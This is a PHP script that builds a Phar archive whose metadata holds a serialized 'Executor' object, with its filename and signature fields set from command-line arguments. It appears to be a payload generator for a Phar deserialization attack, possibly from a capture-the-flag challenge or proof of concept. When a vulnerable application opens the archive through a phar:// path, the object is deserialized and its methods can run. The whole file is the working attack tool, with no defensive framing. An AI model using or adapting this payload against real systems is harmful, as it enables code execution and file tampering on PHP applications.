<?php

	@unlink($argv[1]);
        // Create a new archive
        $phar = new Phar($argv[1]);

        // Add all write operations to a buffer, without modifying the archive on disk
        $phar->startBuffering();

        // Set the stub
	$phar->setStub("<?php __HALT_COMPILER(); ?>");

        /* Add a new file in the archive with "text" as its content*/
        $phar->addFromString("text.txt", "text");

	class Executor {
		private $filename;
		private $signature;
		private $init;

		function __construct($filename, $signature, $init){
			$this->filename = $filename;
			$this->signature = $signature;
			$this->init = $init;
                }
	};

        $exec = new Executor($argv[2], $argv[3], False);

        // Add the executor object to the metadata. This will be serialized
        $phar->setMetadata($exec);

        // Stop buffering and write changes to disk
        $phar->stopBuffering();
?>
